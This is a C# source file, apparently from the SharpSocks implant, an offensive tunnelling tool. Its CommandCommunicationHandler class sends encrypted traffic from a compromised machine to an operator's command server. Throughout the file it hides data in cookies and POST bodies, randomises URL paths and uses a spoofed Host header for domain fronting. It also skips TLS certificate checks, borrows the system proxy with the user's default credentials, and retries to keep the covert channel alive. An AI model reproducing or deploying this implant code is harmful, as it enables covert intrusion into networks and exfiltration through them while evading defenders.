using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using SharpSocksCommon;
using SharpSocksCommon.Encryption;
using SharpSocksImplant.Config;
using SharpSocksImplant.Logging;
using SharpSocksImplant.Utils;

namespace SharpSocksImplant.Comms
{
    public class CommandCommunicationHandler
    {
        private const string HOST_HEADER_NAME = "Host";

        private readonly SocksClientConfiguration _config;
        private readonly IEncryptionHelper _encryption;
        private readonly AutoResetEvent _timeout = new AutoResetEvent(false);
        private readonly Random _urlRandomizer = new Random();
        private bool? _initialConnectionSucceeded;

        public CommandCommunicationHandler(IEncryptionHelper encryption, SocksClientConfiguration config)
        {
            _encryption = encryption;
            _config = config;
        }

        public IImplantLog ImplantComms { get; set; }

        public List<byte> Send(string targetId, List<byte> payload, out bool commandChannelDead)
        {
            return Send(targetId, CommandChannelStatus.NO_CHANGE, payload, out commandChannelDead);
        }

        public List<byte> Send(string targetId, CommandChannelStatus status, List<byte> payload, out bool commandChannelDead)
        {
            commandChannelDead = false;
            ImplantComms.LogMessage(payload == null
                ? $"[{targetId}][Implant -> SOCKS Server] Sending 0 bytes"
                : $"[{targetId}][Implant -> SOCKS Server] Sending {payload.Count} bytes");
            var encryptedSessionPayload = _encryption.Encrypt(Encoding.UTF8.GetBytes(targetId + ":" + status).ToList());
            var cookieContainer = new CookieContainer();
            var webClientEx = new WebClientEx(cookieContainer, _config.InsecureSSL)
            {
                UserAgent = _config.UserAgent
            };
            if (!string.IsNullOrWhiteSpace(_config.HostHeader))
            {
                webClientEx.Headers.Add(HOST_HEADER_NAME, _config.HostHeader);
            }

            if (_config.UseProxy)
            {
                if (_config.WebProxy == null)
                {
                    webClientEx.Proxy = WebRequest.GetSystemWebProxy();
                    webClientEx.Proxy.Credentials = CredentialCache.DefaultCredentials;
                }
                else
                {
                    webClientEx.Proxy = _config.WebProxy;
                }
            }

            var sessionCookie = new Cookie(_config.SessionCookieName ?? "", encryptedSessionPayload ?? "")
            {
                Domain = string.IsNullOrWhiteSpace(_config.HostHeader) ? _config.Url.Host : _config.HostHeader.Split(':')[0]
            };
            cookieContainer.Add(sessionCookie);
            string encryptedPayload = null;
            if (payload != null)
                if (payload.Count > 0)
                    try
                    {
                        encryptedPayload = _encryption.Encrypt(payload);
                        if (string.IsNullOrWhiteSpace(encryptedPayload))
                        {
                            ImplantComms.LogError($"[{targetId}][Implant -> SOCKS Server] Encrypted payload was null, it shouldn't be");
                            if (!_initialConnectionSucceeded.HasValue)
                                _initialConnectionSucceeded = false;
                            return null;
                        }
                    }
                    catch (Exception e)
                    {
                        ImplantComms.LogError(e.Message);
                        return null;
                    }

            var retryRequired = false;
            var retryInterval = 2000;
            ushort retryCount = 0;
            var errorId = Guid.NewGuid();
            do
            {
                try
                {
                    string response;
                    var uri = BuildServerUri();
                    if (encryptedPayload != null && encryptedPayload.Length > 4096)
                    {
                        ImplantComms.LogMessage(!string.IsNullOrEmpty(_config.HostHeader)
                            ? @$"[{targetId}][Implant -> SOCKS Server] Sending POST request to {uri} with host header: {_config.HostHeader}"
                            : @$"[{targetId}][Implant -> SOCKS Server] Sending POST request to {uri} (no host header)");
                        response = webClientEx.UploadString(uri, encryptedPayload);
                    }
                    else
                    {
                        if (payload != null && payload.Count > 0)
                        {
                            var payloadCookie = new Cookie(_config.PayloadCookieName ?? "", encryptedPayload ?? "");
                            var hostHeader = string.IsNullOrWhiteSpace(_config.HostHeader) ? _config.Url.Host : _config.HostHeader.Split(':')[0];
                            payloadCookie.Domain = hostHeader;
                            cookieContainer.Add(payloadCookie);
                        }

                        ImplantComms.LogMessage(!string.IsNullOrEmpty(_config.HostHeader)
                            ? @$"[{targetId}][Implant -> SOCKS Server] Sending GET request to {uri} with host header: {_config.HostHeader}"
                            : @$"[{targetId}][Implant -> SOCKS Server] Sending GET request to {uri} (no host header)");
                        response = webClientEx.DownloadString(uri);
                    }

                    _initialConnectionSucceeded ??= true;
                    var data = !string.IsNullOrEmpty(response) ? _encryption.Decrypt(response) : new List<byte>();
                    ImplantComms.LogMessage(@$"[{targetId}][SOCKS Server -> Implant] Received {data.Count} bytes");
                    return data;
                }
                catch (WebException e)
                {
                    if (WebExceptionAnalyzer.IsTransient(e))
                    {
                        if (15 > retryCount++)
                        {
                            ImplantComms.LogError(
                                $"[{targetId}][Implant -> SOCKS Server] Error has occured and looks like it's transient going to retry in {retryInterval} milliseconds: {e}");
                            retryRequired = true;
                            if (retryInterval++ > 2)
                                retryInterval += retryInterval;
                            _timeout.WaitOne(retryInterval);
                        }
                        else
                        {
                            ImplantComms.LogError(
                                $"[{targetId}][Implant -> SOCKS Server] Kept trying but afraid error isn't going away {retryInterval} {e.Message} {e.Status.ToString()} {_config.CommandServerUi} {errorId.ToString()}");
                            commandChannelDead = true;
                            return null;
                        }
                    }
                    else if (targetId == _config.CommandChannelSessionId)
                    {
                        if (!RetryUntilFailure(ref retryCount, ref retryRequired, ref retryInterval, targetId))
                        {
                            ImplantComms.LogImportantMessage($"[{targetId}][Implant -> SOCKS Server] Command channel re-tried connection 5 times giving up");
                            ReportErrorWebException(e, errorId, targetId);
                            commandChannelDead = true;
                            return null;
                        }

                        retryRequired = true;
                    }
                    else
                    {
                        ReportErrorWebException(e, errorId, targetId);
                        if (HttpStatusCode.NotFound == ((HttpWebResponse)e.Response).StatusCode)
                        {
                            ImplantComms.LogMessage($"[{targetId}][Implant -> SOCKS Server] Connection on server has been killed");
                        }
                        else
                        {
                            ImplantComms.LogError($"[{targetId}][Implant -> SOCKS Server] Send to {_config.Url} failed with {e}");
                        }

                        return null;
                    }
                }
            } while (retryRequired);

            if (!_initialConnectionSucceeded.HasValue)
            {
                commandChannelDead = true;
                _initialConnectionSucceeded = false;
            }

            return null;
        }

        private bool RetryUntilFailure(ref ushort retryCount, ref bool retryRequired, ref int retryInterval, string targetId)
        {
            if (5 <= retryCount++)
                return retryRequired = false;
            ImplantComms.LogError($"[{targetId}][Implant -> SOCKS Server] Command Channel failed to connect: retry interval {retryInterval} ms");
            _timeout.WaitOne(retryInterval);
            retryInterval += retryInterval;
            return true;
        }

        private Uri BuildServerUri(string payload = null)
        {
            if (_config.Tamper != null)
                return new Uri(_config.Tamper.TamperUri(_config.CommandServerUi, payload));
            return _config.UrlPaths.Count == 0 ? new Uri(_config.Url, "Upload") : new Uri(_config.Url, _config.UrlPaths[_urlRandomizer.Next(0, _config.UrlPaths.Count)]);
        }

        private void ReportErrorWebException(WebException e, Guid errorId, string targetId)
        {
            var messageList = new StringBuilder();
            messageList.Append($"[{targetId}][Implant -> SOCKS Server] Web Exception\n");
            messageList.Append($"\tMessage: {e.Message}\n");
            messageList.Append($"\tStatus: {e.Status.ToString()}\n");
            messageList.Append($"\tCommandServerUI: {_config.CommandServerUi}\n");
            messageList.Append($"\tErrorId: {errorId.ToString()}\n");
            messageList.Append($"\tResponse from: {e.Response.ResponseUri}\n");
            messageList.Append($"\tResponse headers: {e.Response.Headers}\n");
            var responseStream = e.Response.GetResponseStream();
            if (responseStream != null)
            {
                string body;
                using (var reader = new StreamReader(responseStream))
                {
                    body = reader.ReadToEnd();
                }

                messageList.Append($"\tResponse content:\n {body}");
            }

            messageList.Append($"\tStackTrace:\n {e.StackTrace}");
            ImplantComms.LogError(messageList.ToString());
        }
    }
}